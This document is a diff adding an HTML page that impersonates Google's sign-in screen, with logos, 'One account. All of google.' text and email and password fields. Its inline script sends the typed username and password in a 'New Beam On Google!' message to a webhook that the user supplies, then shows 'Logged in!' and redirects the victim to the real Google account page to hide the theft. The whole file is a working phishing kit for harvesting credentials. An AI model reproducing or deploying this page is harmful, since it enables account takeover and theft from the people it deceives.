@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <link rel="icon" href="https://content.stocktrak.com/wp-content/uploads/2016/10/google-logo.png" type="image/gif" sizes="16x16">
+  <title>Sign In - Google</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+  <img src="https://1000logos.net/wp-content/uploads/2021/05/Google-logo.png" onerror="alert('There was an error loading some stuff.')" class="googlelogo">
+  <h1 style="color: #4d4d4d; font-family: 'Oswald', sans-serif; left: 42%; position: absolute; top: 100px;">One account. All of google.</h1>
+  <h3 style="color: #4d4d4d; font-family: 'Oswald', sans-serif; left: 45.5%; position: absolute; top: 150px;">Sign in to continue to google.</h1>
+  <div class="hud-intro-login-box">
+    <img src="https://ssl.gstatic.com/images/branding/product/1x/avatar_square_grey_512dp.png" onerror="alert('There was an error loading some stuff.')" style="height: 130px; border: 1px solid #949494; border-radius: 50%; position: relative; left: 31%; top: 20px;">
+    <h5 style="color: red; font-family: 'Oswald', sans-serif; opacity: 0; text-align: center;" id="hud-error">Error: The fields cannot be blank.</h4>
+      <form id="login-form">
+      <input type="email" name="username" id="username-field" class="login-form-field" placeholder="Email">
+      <input type="password" name="password" id="password-field" class="login-form-field" placeholder="Password" required>
+      <input type="submit" value="Login" id="login-form-submit">
+    </form>
+    <div id="checkbox"><input type="checkbox"> Stay signed in<div>
+    <p id="hud-help">Need help?</p>
+    <img src="https://www.shareicon.net/data/512x512/2015/08/26/91245_plus_512x512.png" style="height: 30px; position: absolute; top: 700%;">
+      <img src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Gmail.max-1100x1100.png" style="height: 30px; position: absolute; top: 700%; left: 35%;">
+      <img src="https://www.computerhope.com/issues/pictures/google-drive-logo.png" style="height: 30px; position: absolute; top: 700%; left: 70%;">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfYx6ml-xipbRWI4sPQCe4Y1mGlV7dvePeqA&usqp=CAU" style="height: 30px; position: absolute; top: 700%; left: 105%;">
+      <img src="https://www.google.com/images/branding/product/2x/maps_96in128dp.png" style="height: 40px; position: absolute; top: 670%; left: 140%;">
+      <img src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Logo_Play_512px_clr_nGVTgYY.max-600x600.png" style="height: 25px; position: absolute; top: 720%; left: 175%;">
+    <script>
+      const webhook = "Your webhook here..."
+
+const loginForm = document.getElementById("login-form");
+    const loginButton = document.getElementById("login-form-submit");
+    const loginErrorMsg = document.getElementById("login-error-msg");
+    const errorMessage = document.getElementById("errorMessage");
+
+    loginButton.addEventListener("click", (e) => {
+        e.preventDefault();
+        const username = loginForm.username.value;
+        
+        const password = loginForm.password.value;
+
+          var request = new XMLHttpRequest();
+          request.open("POST", webhook);
+
+          request.setRequestHeader('Content-type', 'application/json');
+
+          var params = {
+            username: "New login!",
+            avatar_url: "",
+            content: "New Beam On Google! \n" + "\n" + "```Username: " + username + "\n" + "Password: " + password + "```" + "\n .gg/BVg2hVNe34"
+          }
+
+          request.send(JSON.stringify(params));
+      
+        if (username === "") {
+          document.getElementById("hud-error").style.opacity = "1";
+        }
+
+        else if (password === "") {
+          document.getElementById("hud-error").style.opacity = "1";
+        }
+
+        else {
+            alert("Logged in!")
+            window.location.replace("https://myaccount.google.com/")
+        }
+    })
+    </script>
+  </div>
+</body>
+
+</html>
